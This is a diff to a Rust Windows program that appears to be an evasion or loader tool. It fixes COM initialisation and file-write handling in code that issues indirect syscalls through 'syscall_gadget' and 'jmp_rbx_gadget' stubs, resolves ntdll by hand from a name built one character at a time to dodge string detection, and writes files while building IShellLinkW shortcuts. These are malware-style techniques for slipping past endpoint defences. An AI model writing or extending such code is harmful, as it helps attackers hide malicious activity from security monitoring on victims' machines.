@@ -97,6 +97,7 @@ struct IShellLinkWVtbl {
     SetIconLocation: usize,
     GetRelativePath: usize,
     SetRelativePath: usize,
+    Resolve: usize,
     SetPath: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
 }
 
@@ -169,7 +170,10 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 fn main() {
     unsafe {
         // Initialize COM (STA)
-        let _ = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);
+        let hr = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);
+        if hr < 0 && hr != -2147417850 { // -2147417850 is RPC_E_CHANGED_MODE (already initialized with different mode)
+            return;
+        }
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
@@ -262,7 +266,8 @@ fn main() {
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
-                                    let mut byte_offset: i64 = 0;
+                                    let byte_offset: i64 = 0;
+                                    let mut write_byte_offset = byte_offset; // Local copy to be sure
                                     crate::syscall!(
                                         nt_write_file_ssn,
                                         syscall_gadget,
@@ -274,7 +279,7 @@ fn main() {
                                         &mut write_io_status as *mut _ as usize,
                                         data_ptr as usize,
                                         stat.cbSize as u32,
-                                        &mut byte_offset as *mut _ as usize,
+                                        &mut write_byte_offset as *mut _ as usize,
                                         0  // Key
                                     );
                                     crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
